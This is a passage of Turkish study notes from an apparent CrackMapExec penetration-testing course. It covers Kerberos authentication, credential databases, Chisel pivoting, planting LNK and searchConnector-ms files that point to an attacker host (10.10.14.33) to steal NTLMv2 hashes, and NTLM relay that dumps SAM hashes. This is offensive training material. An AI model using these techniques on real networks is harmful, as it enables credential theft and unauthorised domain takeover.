+Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.
+
+
+### Using AES-128 or AES-256
+Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.
+
+
+### AES256 ile Kimlik Doğrulama
+
+![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)
+
+![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)
+
+
+### CCache file - Kerberos Authentication
+
+Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.
+
+Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım
+
+Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.
+
+
+### Ticket Granting Tickets
+
+![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)
+
+![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)
+
+Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.
+
+
+### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)
+
+![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)
+
+
+### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)
+
+![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
+Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.
+
+
+### MSSQL Protokolü ile ccache Dosyasını Kullanma
+
+![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)
+
+Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz
+
+
+### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme
+
+![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
+![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)
+
+
+CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz
+
+
+### CMEDB'de Uzmanlaşmak
+
+CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.
+
+
+### Varsayılan Veritabanlarını Listeleme
+
+![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)
+
+### Veritabanı ile Etkileşim
+
+CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:
+
+### CMEDB
+![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)
+
+
+### Workspaces
+Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.
+
+
+### Creating a Workspace
+
+![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)
+
+Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.
+
+
+### Çalışma Alanlarını Listeleme ve Değiştirme
+
+
+![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
+![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)
+
+
+### Bir Protokolün Veritabanına Erişim
+
+cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:
+
+![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)
+
+Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:
+
+
+### SMB Protokol Veritabanına Bağlanma
+![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)
+
+
+### Protocol Options
+SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.
+
+### Kimlik Bilgilerini Görüntüleme
+CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.
+
+
+### Displaying SMB Credentials
+
+![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)
+
+![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)
+
+Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.
+
+
+### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme
+
+![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)
+
+![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)
+
+Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir
+
+MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir
+
+
+### MSSQL için Kimlik Bilgilerini Görüntüleme
+![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)
+
+Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.
+
+
+### Kimlik Bilgilerini Kullanma
+
+CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.
+
+### CrackMapExec ile Etkileşim için CredID Kullanımı
+
+![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)
+
+
+### Hosts Information
+
+MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.
+
+
+### Displaying Hosts
+![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)
+
+![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)
+
+
+### Share Information
+
+CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.
+
+### Paylaşımları Geri Alma
+
+![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)
+
+
+### Kullanıcı Ekleme ve Kaldırma
+CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.
+
+
+### cmedb'ye Kullanıcı Ekleme
+
+![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
+Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.
+
+
+### Bir Kullanıcıyı cmedb'den Kaldırma
+
+![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)
+
+![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)
+
+
+### Empire Kimlik Bilgilerini İçe Aktarma
+cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.
+
+
+### Import from Empire
+
+![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)
+
+Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun
+
+### Export cmedb Data
+
+CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz
+
+
+### Kimlik Bilgilerini cmedb'den Dışa Aktarma
+
+![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)
+
+![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)
+
+Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.
+
+![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)
+
+
+
+### skill 
+
+CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.
+
+
+### Hedef ortama bağlanma adımları
+
+Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:
+
+
+### Connecting to the Internal Network VPN
+
+![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
+![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)
+
+Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.
+
+Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.
+
+Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
+proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi., 'print
+
+Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
+
+
+### Kullanıcının Kullanabileceği Dosyaları Listeleme
+
+{{CODE_BLOCK_94}}
+
+Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:
+
+{{CODE_BLOCK_95}}
+
+{{CODE_BLOCK_96}}
+
+Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
+
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
+
+
+### Spider_plus Options
+
+{{CODE_BLOCK_97}}
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
+
+
+### Proxychains with CME
+
+### Scenario
+
+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
+![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
+
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+
+
+### Set Up the Tunnel
+
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
+
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+
+### Chisel - Reverse Tunnel
+
+{{CODE_BLOCK_98}}
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+
+
+### Upload Chisel
+
+{{CODE_BLOCK_99}}
+
+
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+
+
+### Connect to the Chisel Server
+
+{{CODE_BLOCK_100}}
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
+
+### Chisel Receiving Session No. 1
+
+{{CODE_BLOCK_101}}
+
+TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
+
+
+### Check Listening Port
+
+{{CODE_BLOCK_102}}
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+
+
+### Configure Proxychains
+
+{{CODE_BLOCK_103}}
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
+
+### CrackMapExec'in Proxychains ile Test Edilmesi
+
+{{CODE_BLOCK_104}}
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
+
+### Quiet Seçeneği ile Proxychains4
+
+{{CODE_BLOCK_105}}
+
+Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
+
+
+### Killing Chisel on the Target Machine
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+
+### Kill the Chisel Client
+
+{{CODE_BLOCK_106}}
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+
+
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+{{CODE_BLOCK_107}}
+
+Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
+
+
+### Attack Host Üzerinde Chisel'i Kapatma
+
+{{CODE_BLOCK_108}}
+
+
+### Sunucu olarak Windows ve Client olarak Linux
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
+
+
+### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
+
+{{CODE_BLOCK_109}}
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
+
+
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_110}}
+
+Şimdi Proxychains'i tekrar kullanabiliriz:
+
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
+
+{{CODE_BLOCK_111}}
+
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
+
+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+
+Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
+
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+
+
+### Slinky Modülü
+
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
+
+
+### Slinky Module Options
+
+{{CODE_BLOCK_112}}
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
+
+
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+
+
+### Hedef Makine Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_113}}
+
+
+### NTLMv2 Hash'lerinin Çalınması
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+
+### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
+
+{{CODE_BLOCK_114}}
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
+
+
+### Using Slinky
+
+{{CODE_BLOCK_115}}
+
+
+![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
+
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
+
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
+
+
+### Starting Responder
+
+{{CODE_BLOCK_116}}
+
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
+
+
+### **NTLM Relay**
+
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
+
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
+
+### Getting Relay List
+
+{{CODE_BLOCK_117}}
+
+
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
+
+### Execute NTLMRelayX
+
+{{CODE_BLOCK_118}}
+
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
+
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+{{CODE_BLOCK_119}}
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+
+### Local Hesapları Test Etme
+
+{{CODE_BLOCK_120}}
+
+### Her Şeyi Temizleyin
+
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
+
+### Cleanup
+
+{{CODE_BLOCK_121}}
+
+### drop-sc Modülü ile Hash'lerin Çalınması
+Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
+
+Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+
+CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+
+İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
+
+* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+
+* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+
+* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+
+Drop-sc'yi iş başında görelim:
+
+
+### Dropping a searchConnector-ms File
+
+![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+
+![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+
+Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+
+
+### NTLMRelayx ve drop-sc Kullanarak Aktarma
+
+![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
+![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+
+Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+
+
+### searchConnector-ms Dosyalarını Temizleme
+![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
+![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
+
+LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+
+### SMB ile Eşleme ve Numaralandırma
+
+CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
+
+![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
+![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+
+Daha önce çalışmamış olanları gözden geçirelim:
+
+### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+
+Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+
+
+### Sessions ve loggendon-users seçeneklerini kullanma
